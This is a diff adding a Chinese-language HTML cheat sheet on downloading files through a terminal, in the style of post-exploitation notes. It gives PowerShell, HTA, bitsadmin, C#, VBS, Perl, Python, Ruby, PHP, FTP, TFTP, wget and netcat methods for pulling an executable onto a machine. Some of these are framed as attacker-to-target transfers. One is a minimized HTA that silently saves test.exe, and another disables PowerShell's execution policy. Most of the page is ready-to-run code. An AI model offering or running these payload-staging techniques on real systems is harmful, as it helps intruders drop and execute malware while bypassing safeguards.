@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>终端方式下载文件</title>
+<style>
+			body{
+				width: 100%;
+				height: 100%;
+				background-color:#B2DFEE;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+		</style>
+		</head>
+<body>
+<div>
+
+
+<br/><br/>
+<!--文章title-->
+<center>
+<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>终端方式下载文件</h2></strong></font>
+</center>
+<!--主体内容-->
+<div><br/><br/>
+<div style="padding-left:250px;"> 
+<p><div itemprop="articleBody">
+<h1>Powershell</h1>
+<p>创建如下PSL脚本：</p>
+<pre><code>$p = New-Object System.Net.WebClient 
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) 
+</code></pre>
+<p>执行：</p>
+<pre><code>PS C:&gt; .test.ps1
+</code></pre>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<pre><code>C:&gt;powershell set-executionpolicy unrestricted
+</code></pre>
+<pre><code>附加：亲自调试的一个psl命令如下，在dos中执行就可以
+<textarea cols=115 rows=3>附加：亲自调试的一个psl命令如下，在dos中执行就可以:
+powershell (new-object System.Net.WebClient).DownloadFile( 'http://ahcert.org.cn/page/anquan/down.html','e:/test.exe')
+</textarea>
+</code></pre>
+<!--more-->
+<h1>Hta</h1>
+<p>创建文件test.hta</p>
+<pre><code>
+<textarea cols=100 rows=25> 
+<html>
+<head>
+<script>
+var Object = new ActiveXObject("MSXML2.XMLHTTP");
+Object.open("GET","http://ahcert.org.cn/page/anquan/down.html",false);
+Object.send();
+if (Object.Status == 200)
+{
+var Stream = new ActiveXObject("ADODB.Stream");
+Stream.Open();
+Stream.Type = 1;
+Stream.Write(Object.ResponseBody);
+Stream.SaveToFile("e:/test.exe", 2);
+Stream.Close();
+}
+window.close();
+</script>
+<HTA:APPLICATION ID="test"
+WINDOWSTATE = "minimize">
+</head>
+<body>
+</body>
+</html>
+</textarea> 
+</code></pre>
+<p>保存文件为test.hta，终端运行即可</p>
+
+
+<h1>bitsadmin</h1>
+<p>在终端执行如下命令</p>
+<pre><code>
+<textarea cols=115 rows=3>
+bitsadmin /transfer n http://ahcert.org.cn/page/anquan/down.html e:\test.php 
+</textarea>
+</code></pre>
+<p>PS:请注意\/符号</p>
+
+
+<h1>Hta</h1>
+<p>创建文件test.cs</p>
+<pre><code>
+<textarea cols=100 rows=20> 
+using System.Net;
+namespace downloader
+{
+class Program
+{
+static void Main(string[] args)
+{
+WebClient client = new WebClient();
+string URLAddress = @"http://ahcert.org.cn/page/anquan/down.html";
+string receivePath = @"e:\";
+client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
+(URLAddress));
+}
+}
+}
+
+</textarea> 
+</code></pre>
+<p>保存文件为test.cs</p>
+<p>然后终端下运行如下命令<br/><textarea cols=100 rows=3> C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:e:\test.exe C:\Users\ahcert\Desktop\1.cs</textarea></p>
+<p>这时候会产生e:\test.exe文件，再次运行test.exe，则会生成你要下载的文件，上面我写定的文件是down.html,在当前目录会产生</p>
+
+
+
+<h2> Visual Basic</h2>
+<p>创建如下VBS脚本。</p>
+<pre><code>Set args = Wscript.Arguments
+Url = &quot;http://domain/file&quot;
+dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
+dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
+xHttp.Open &quot;GET&quot;, Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile &quot; C:\%homepath%\file&quot;, 2 '
+end with
+</code></pre>
+<p>执行：</p>
+<pre><code>C:&gt;cscript test.vbs
+</code></pre>
+<span id="menu_index_3" name="menu_index_3"></span><h2> Perl</h2>
+<p>脚本如下:</p>
+<pre><code>#!/usr/bin/perl 
+use LWP::Simple; 
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
+</code></pre>
+<p>执行：</p>
+<pre><code>root@kali:~# perl test.pl
+</code></pre>
+<h2> Python</h2>
+<p>脚本如下：</p>
+<pre><code>#!/usr/bin/python 
+import urllib2 
+u = urllib2.urlopen('http://domain/file') 
+localFile = open('local_file', 'w') 
+localFile.write(u.read()) 
+localFile.close()
+</code></pre>
+<p>执行：</p>
+<pre><code>root@kali:~# python test.py
+</code></pre>
+<h2> Ruby</h2>
+<p>脚本如下：</p>
+<pre><code>#!/usr/bin/ruby
+require 'net/http'
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}
+</code></pre>
+<p>执行：</p>
+<pre><code>root@kali:~# ruby test.rb
+</code></pre>
+<h2>PHP</h2>
+<p>脚本如下：</p>
+<pre><code>#!/usr/bin/php 
+&lt;?php $data = @file(&quot;http://example.com/file&quot;);
+$lf = &quot;local_file&quot;;         
+$fh = fopen($lf, 'w');         
+fwrite($fh, $data[0]);         
+fclose($fh); 
+?&gt;
+</code></pre>
+<p>执行：</p>
+<pre><code>root@kali:~# php test.php
+</code></pre>
+<h2> FTP</h2>
+<p>执行如下命令：</p>
+<pre><code>ftp 127.0.0.1 username password get file exit
+</code></pre>
+<h2>TFTP</h2>
+<p>执行如下命令：</p>
+<pre><code>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
+<textarea cols=115 rows=3>tftp -i 192.168.174.151 GET d:\soft\tftp\test.exe e:\test.exe</textarea>
+</code></pre>
+<h2> Bitsadmin</h2>
+<p>执行如下命令：</p>
+<pre><code>bitsadmin /transfer n http://domain/file c:%homepath%file
+</code></pre>
+<h2> Wget</h2>
+<p>执行如下命令：</p>
+<pre><code>wget http://example.com/file<br/>这里建议用Linux下：wget http://example.com/file.tar.gz，Windows：wget http://example.com/test/file.php，这样下载的干净
+</code></pre>
+<h2>Netcat</h2>
+<p>attacker执行如下命令：</p>
+<pre><code>cat file | nc -l 1234
+</code></pre>
+<p>target执行：</p>
+<pre><code>nc host_ip 1234 &gt; file
+</code></pre>
+<h2> Window 文件共享</h2>
+<p>使用如下命令:</p>
+<pre><code>net use x: \127.0.0.1\share /user:example.comuserID myPassword
+</code></pre>
+<span id="menu_index_13" name="menu_index_13"></span><h2>记事本：</h2>
+<ul>
+<li><ol>
+<li>打开记事本</li>
+</ol></li>
+<li><ol start="2">
+<li>文件，打开</li>
+</ol></li>
+<li><ol start="3">
+<li>在文件名处填入你要下载的文件地址</li>
+</ol></li>
+</ul><br/>
+参考地址：https://evi1cg.me/archives/13-ways-to-download-a-file.html<br/>
+参考地址：http://wooyun.jozxing.cc/static/drops/tips-14101.html
+<br/>
+
+
+
+<!--其他功能-->
+<center>
+<input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/>
+<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+
+</body>
+</html>
